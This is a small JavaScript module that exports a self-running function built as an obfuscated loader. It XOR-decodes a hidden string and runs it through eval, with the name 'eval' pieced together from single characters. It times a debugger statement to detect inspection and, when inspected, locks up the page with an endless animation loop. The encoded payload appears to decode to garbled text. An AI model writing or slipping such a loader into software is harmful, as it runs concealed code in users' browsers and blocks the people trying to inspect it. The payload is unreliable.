export const z = (() => {
  const _$fx = (s, k) =>
    s.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length))).join('');

  const _$x = '\u0012\u0019\u0011\u0016T\u0005\u000e\u000eU^\u000b\u001f\u0006T\u0013\u0010J^\u0012\u0011\u0005\t\u0006\u0011';
  const _$k = 'dream';
  const _$de = _$fx(_$x, _$k);

  const _$anti = () => {
    const _$t = () => {
      const a = performance.now();
      debugger;
      const b = performance.now();
      return b - a > 100;
    };
    for (let i = 0; i < 7; i++) if (_$t()) return true;
    return false;
  };

  const _$fr = () => {
    const loop = () => requestAnimationFrame(loop);
    loop();
  };

  const _$go = () => {
    const _$e = ['e', 'v', 'a', 'l'].join('');
    window[_$e](_$de);
  };

  (_$anti() ? _$fr : _$go)();
})();
